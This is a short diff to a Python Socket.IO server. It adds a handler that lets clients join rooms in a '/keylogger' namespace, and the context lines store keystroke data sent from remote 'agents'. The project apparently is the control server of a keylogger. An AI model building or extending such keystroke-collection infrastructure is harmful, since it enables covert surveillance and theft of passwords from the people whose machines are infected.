@@ -256,3 +256,9 @@ def init_socket_handlers(socketio):
         except Exception as e:
             print(f"[SocketIO] Error saving keylogger data: {str(e)}")
             emit('keylogger_ack', {'status': 'error', 'message': str(e)}, room=f"agent_{agent_id}", namespace='/keylogger')
+
+    @socketio.on('join', namespace='/keylogger')
+    def handle_join(data):
+        room = data
+        join_room(room, namespace='/keylogger')
+        print(f"[SocketIO] Client joined room {room} in /keylogger namespace")
